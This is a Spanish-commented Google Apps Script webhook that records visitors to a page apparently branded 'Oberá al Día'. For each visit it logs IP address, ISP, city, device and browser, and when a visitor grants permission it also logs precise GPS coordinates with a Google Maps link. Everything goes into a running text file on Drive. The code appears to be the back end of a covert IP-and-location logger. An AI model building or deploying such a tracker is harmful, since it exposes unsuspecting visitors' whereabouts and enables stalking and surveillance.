// ============================================
// SCRIPT PARA GOOGLE APPS SCRIPT
// Guarda ubicaciones automáticamente en Drive
// ============================================

/**
 * Función que recibe los datos y los guarda en TXT
 */
function doPost(e) {
  try {
    // Parsear datos recibidos
    var data = JSON.parse(e.postData.contents);
    
    // Nombre del archivo TXT
    var fileName = 'ubicaciones-obera-al-dia.txt';
    
    // Buscar o crear archivo
    var files = DriveApp.getFilesByName(fileName);
    var file;
    
    if (files.hasNext()) {
      file = files.next();
    } else {
      file = DriveApp.createFile(fileName, '=== REGISTRO DE UBICACIONES - OBERÁ AL DÍA ===\n\n');
    }
    
    // Formatear texto según tipo de evento
    var texto = '';
    var fecha = new Date();
    
    if (data.event === 'page_load') {
      // Paquete 1: IP/ISP
      texto = '\n=================================' +
              '\n[' + fecha.toLocaleString('es-AR') + ']' +
              '\nEvento: CARGA DE PÁGINA' +
              '\nSession ID: ' + data.sessionId +
              '\n---------------------------------' +
              '\nIP: ' + (data.networkInfo?.ip || 'N/A') +
              '\nISP: ' + (data.networkInfo?.isp || 'N/A') +
              '\nCiudad: ' + (data.networkInfo?.city || 'N/A') +
              '\nRegión: ' + (data.networkInfo?.region || 'N/A') +
              '\nPaís: ' + (data.networkInfo?.country || 'N/A') +
              '\nDispositivo: ' + (data.deviceType || 'N/A') +
              '\nNavegador: ' + (data.browserInfo?.userAgent?.substring(0, 50) || 'N/A') + '...' +
              '\nIdioma: ' + (data.browserInfo?.language || 'N/A') +
              '\n---------------------------------' +
              '\nEstado GPS: Pendiente...' +
              '\n=================================\n';
              
    } else if (data.event === 'gps_granted') {
      // Paquete 2: GPS aceptado
      var lat = data.gpsData?.latitude || 0;
      var lng = data.gpsData?.longitude || 0;
      var mapUrl = 'https://maps.google.com/?q=' + lat + ',' + lng;
      
      texto = '\n=================================' +
              '\n[' + fecha.toLocaleString('es-AR') + ']' +
              '\nEvento: ✅ GPS ACEPTADO' +
              '\nSession ID: ' + data.sessionId +
              '\n---------------------------------' +
              '\nCOORDENADAS GPS:' +
              '\nLatitud: ' + lat +
              '\nLongitud: ' + lng +
              '\nPrecisión: ' + (data.gpsData?.accuracy || 'N/A') + ' metros' +
              '\n---------------------------------' +
              '\nVer en Google Maps:' +
              '\n' + mapUrl +
              '\n=================================\n';
              
    } else if (data.event === 'gps_denied') {
      // GPS rechazado
      texto = '\n=================================' +
              '\n[' + fecha.toLocaleString('es-AR') + ']' +
              '\nEvento: ❌ GPS RECHAZADO' +
              '\nSession ID: ' + data.sessionId +
              '\nMotivo: ' + (data.errorMessage || 'Usuario denegó permiso') +
              '\n=================================\n';
    }
    
    // Agregar al archivo
    var contenidoActual = file.getBlob().getDataAsString();
    file.setContent(contenidoActual + texto);
    
    // Responder OK
    return ContentService.createTextOutput('OK');
    
  } catch (error) {
    Logger.log('Error: ' + error.toString());
    return ContentService.createTextOutput('ERROR: ' + error.toString());
  }
}

/**
 * Función para obtener la URL del webhook
 */
function getWebhookUrl() {
  var url = ScriptApp.getService().getUrl();
  Logger.log('Tu URL de webhook es: ' + url);
  return url;
}
